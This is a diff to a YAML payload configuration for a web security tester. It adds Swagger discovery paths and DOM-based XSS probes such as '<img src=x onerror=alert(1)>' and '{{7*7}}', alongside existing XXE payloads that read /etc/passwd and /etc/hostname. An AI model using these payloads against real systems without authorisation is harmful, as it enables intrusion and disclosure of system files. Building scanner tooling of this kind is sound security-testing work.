@@ -1,5 +1,3 @@
-# Kho payload và cấu hình cho tất cả các module tester
-
 # Access Control Tester
 access_control:
   paths:
@@ -137,3 +135,24 @@ xxe:
     - { payload: '<?xml version="1.0"?><!DOCTYPE a [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>', subcategory: "File Disclosure" }
     - { payload: '<?xml version="1.0"?><!DOCTYPE a [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><foo>&xxe;</foo>', subcategory: "File Disclosure" }
   indicators: ["root:x:0:0:", "www-data:", "daemon:"]
+
+  # API Scanner Configuration
+  api:
+    swagger_paths:
+      - "/swagger.json"
+      - "/api/swagger.json"
+      - "/swagger-ui.html"
+      - "/openapi.json"
+      - "/api/docs"
+      - "/v2/api-docs"
+      - "/docs"
+
+  # DOM-based XSS Configuration (Payloads chuyên dụng để trigger alert)
+  dom_xss:
+    payloads:
+      - "<script>alert(1)</script>"
+      - "<img src=x onerror=alert(1)>"
+      - "javascript:alert(1)"
+      - "#<script>alert(1)</script>"
+      - "\"><img src=x onerror=alert(1)>"
+      - "{{7*7}}"
